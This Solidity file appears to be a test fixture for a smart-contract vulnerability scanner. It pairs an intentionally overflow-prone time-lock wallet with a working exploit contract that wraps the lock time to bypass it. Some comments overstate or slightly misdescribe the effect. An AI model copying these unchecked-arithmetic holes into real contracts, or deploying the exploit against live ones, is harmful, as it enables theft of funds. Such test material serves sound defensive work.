// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// ──────────────────────────────────────────────────────────────────────────────
// SENTINEL TEST SUITE — POSITIVE TEST #1: Integer Overflow / Underflow
// SWC Registry: SWC-101
// ──────────────────────────────────────────────────────────────────────────────
// This contract is intentionally vulnerable.
// It uses Solidity 0.7.x where arithmetic is NOT checked by default.
// The `timeLock` counter and `balances` mapping are both exploitable via
// overflow, allowing an attacker to bypass time locks and drain funds.
// ──────────────────────────────────────────────────────────────────────────────

contract TimeLockWallet {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    /// @notice Deposit ETH and lock it for `_time` seconds.
    function deposit(uint256 _time) public payable {
        balances[msg.sender] += msg.value;
        // VULNERABILITY: lockTime can overflow back to 0 if _time is crafted.
        // An attacker supplies (type(uint256).max - block.timestamp + 1)
        // causing lockTime[msg.sender] to wrap around to 0, unlocking immediately.
        lockTime[msg.sender] = block.timestamp + _time;
    }

    /// @notice Increase lock time by `_secondsToIncrease`.
    function increaseLockTime(uint256 _secondsToIncrease) public {
        // VULNERABILITY: A second overflow vector.
        // If lockTime[msg.sender] is near type(uint256).max, adding
        // _secondsToIncrease causes wrap-around, effectively setting
        // lockTime to a past timestamp and making the withdrawal available.
        lockTime[msg.sender] += _secondsToIncrease;
    }

    /// @notice Withdraw deposited ETH after the lock period.
    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient balance");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    /// @notice Get current contract ETH balance.
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}


/// @title EXPLOIT — demonstrates the overflow attack against TimeLockWallet.
contract OverflowAttack {
    TimeLockWallet public target;

    constructor(address _target) {
        target = TimeLockWallet(_target);
    }

    /// @notice Step 1: Deposit and trigger lock-time overflow.
    function depositAndOverflow() external payable {
        target.deposit{value: msg.value}(
            type(uint256).max   // Forces lockTime overflow to 0
        );
    }

    /// @notice Step 2: Withdraw immediately (lock has overflowed to 0).
    function withdrawAfterOverflow() external {
        target.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
